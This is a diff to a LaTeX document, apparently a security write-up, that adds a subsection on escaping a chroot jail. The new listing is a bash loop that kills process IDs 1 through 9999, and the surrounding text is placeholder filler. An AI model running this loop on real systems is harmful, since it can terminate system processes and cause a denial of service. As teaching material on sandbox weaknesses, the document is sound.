@@ -107,6 +107,26 @@ from SinTick.win:time(60 sec);
 
 \section{\texttt{chroot} vulnerability}
 \lipsum[2]
+\subsection{Kill process outside of the \texttt{chroot} jail}
+
+\vspace{1em}
+\lstset{
+  captionpos=b,
+  frame=single,
+  language=bash,
+  caption=Kill processes outside of chroot jail.,
+  label=chroot:kill
+}
+\begin{lstlisting}
+#!/bin/bash
+i="1"
+while [ $i -lt 10000 ]
+do
+echo $i
+kill $i
+i=$[$i+1]
+done
+\end{lstlisting}
 
 
 \section{Buffer overflow}
